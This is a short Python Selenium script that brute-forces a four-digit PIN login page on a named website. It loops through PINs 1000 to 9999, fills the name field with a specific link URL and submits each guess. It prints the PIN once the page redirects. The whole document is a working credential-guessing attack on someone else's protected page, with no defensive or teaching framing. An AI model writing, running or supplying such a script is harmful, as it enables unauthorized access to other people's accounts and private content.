from selenium import webdriver

driver = webdriver.Chrome('/home/roshan/chromedriver')
driver.get('https://www.getlinks.info/love/loginwithpin.php')


for i in range(1000, 10000):
    driver.refresh()
    user = driver.find_element_by_id('nametb')
    user.send_keys("")
    user.send_keys("https://www.getlinks.info/love/c/sngteni")
    
    pasw=driver.find_element_by_id('pwdtb')
    text=''+str(i)
    pasw.send_keys(text)
    
    driver.find_element_by_id("logbtn").click()
    
    if(driver.current_url!='https://www.getlinks.info/love/loginwithpin.php'):
        print(i)
        break
